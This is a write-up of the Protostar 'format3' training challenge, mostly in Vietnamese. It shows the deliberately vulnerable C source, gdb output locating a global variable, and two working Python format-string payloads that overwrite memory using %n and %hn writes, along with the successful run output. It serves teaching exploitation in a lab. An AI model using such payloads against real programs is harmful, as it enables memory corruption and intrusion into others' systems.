# FORMAT THREE

## About

This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.

This level is at /opt/protostar/bin/format3

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

## Solutions

`FORMAT THREE` tiếp tục là một thử thách được nâng cao từ `FORMAT TWO`, chúng ta vẫn cần ghi một giá trị được kiểm soát vào vị trí ta mong muốn - ở đây vẫn là biến toàn cục `target` để nhận được `"you have modified the target :)"` nhưng thay vì là 1 số decimal thì giá trị cần ghi là `0x01025544`.

Khá phức tạp, ta có `0x01025544 = 16930116` là một giá trị decimal thực sự lớn và nếu vẫn tiếp tục dùng cách ghi đè của `FORMAT TWO` thì ta sẽ không nhận được điều mình cần là `target == 0x01025544` vì số lượng ký tự ghi vào quá lớn.

Thay vào đó ta sẽ ghi lần lượt 4 lần vào từng byte tăng dần bắt đầu từ địa chỉ của biến `target` và với các giá trị là `44` `55` `02` `01` - đây là `[little edian]`.

Địa chỉ `target = 0x80496f4`.

```
root@protostar:/opt/protostar/bin# gdb -q ./format3
Reading symbols from /opt/protostar/bin/format3...done.
(gdb) p target
$1 = 0
(gdb) p &target
$2 = (int *) 0x80496f4
(gdb)
```

Thực hiện quét stack ta có chuỗi đầu vào sẽ được định dạng từ parameter thứ 12.

Tôi sẽ không trình bày chi tiết cách tôi ghi từng byte, thay vào đó bạn có thể đọc từ cuốn sách tôi để ở `Documents`.

```
                 0      1      2
hex     | \x44 | \x55 | \x02 | \x01 |
decimal |  68  |  85  |  258 |  513 |
Đã có   |  16  |  68  |  85  |  258 |
Cần     |  52  |  17  |  173 |  255 |
para    |  12  |  13  |  14  |  15  |
Addr:
0x80496xx| f4  |  f5  |  f6  |  f7  |

```

Tiến hành khai thác:

```
root@protostar:/opt/protostar/bin# python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x" + "%12$n" + "%17x" + "%13$n" + "%173x" + "%14$n" + "%255x" + "%15$n"' | ./format3
                                                   0         bffffac0                                                                                                                                                                     b7fd7ff4                                                                                                                                                                                                                                                              0
you have modified the target :)
```

Cách điền `hn-hn`, bạn có thể tự viết nó khi đã nắm vững hơn cách overwrite everywhere bằng format strings.

```
python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%" + str(0x5544 - 8) + "x%12$hn" + "%" + str(0x10102 - 0x5544) + "x%13$hn"' | ./format3
```


## Documents

<https://en.wikipedia.org/wiki/Printf_format_string>

<https://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c>

Bạn có thể đọc phần Format String của cuốn này:
<https://whitehat.vn/attachments/nghe-thuat-tan-dung-loi-phan-mem-pdf.1430/>



